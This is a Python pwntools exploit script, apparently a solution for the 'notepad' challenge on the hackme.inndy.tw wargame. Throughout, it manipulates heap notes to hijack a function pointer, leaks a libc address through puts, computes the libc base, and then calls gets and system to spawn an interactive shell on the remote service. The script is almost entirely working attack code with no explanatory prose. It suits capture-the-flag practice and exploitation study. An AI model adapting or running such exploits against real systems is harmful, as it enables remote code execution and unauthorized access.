#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys

elfPath = "./notepad"
libcPath = "./libc-2.23.so.i386"
remoteAddr = "hackme.inndy.tw"
remotePort = 7713

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    context.log_level = "debug"
    io = process(elfPath)
    libc = elf.libc
    main_arena = 0x1b3780

else:
    context.log_level = "info"
    if sys.argv[1] == "d":
        io = remote("localhost", 9999)
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

    main_arena = 0x1b2780

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(pidof(io)[0])).readlines()[1], 16)
        cmd = ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd = ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def newNote(size, data):
    io.sendlineafter("::> ", "a")
    io.sendlineafter("> ", str(size))
    io.sendlineafter("> ", data)

def openNote(idx, choice, edit = "n", data = ""):
    io.sendlineafter("::> ", "b")
    io.sendlineafter("> ", str(idx))
    if edit == "y":
        io.sendlineafter(")", "y")
        io.sendlineafter("> ", data)
    else:
        io.sendlineafter(")", "n")
    io.sendlineafter("::> ", choice)

def delNote(idx):
    io.sendlineafter("::> ", "c")
    io.sendlineafter("> ", str(idx))

if __name__ == "__main__":
    io.sendlineafter("::> ", "c")
    newNote(0x8, p32(elf.plt['free']))
    newNote(0x40, 'bbbb')
    newNote(0x8, 'cccc')
    #  DEBUG([0x8048CBF])
    openNote(1, chr(93))

    delNote(0)
    newNote(0x8, p32(elf.plt['puts']))
    #  DEBUG([0x8048CBF])
    openNote(1, chr(93))
    libc.address = u32(io.recvuntil("\xf7")[-4: ]) - 48 - main_arena
    success("libc.address", libc.address)

    delNote(0)
    newNote(0x8, p32(libc.sym['gets']))
    #  DEBUG([0x8048ce8])
    openNote(1, chr(93))
    io.sendline("$0\0")

    delNote(0)
    newNote(0x8, p32(libc.sym['system']))
    #  DEBUG([0x8048CBF])
    openNote(1, chr(93))
  
    io.interactive()
    io.close()
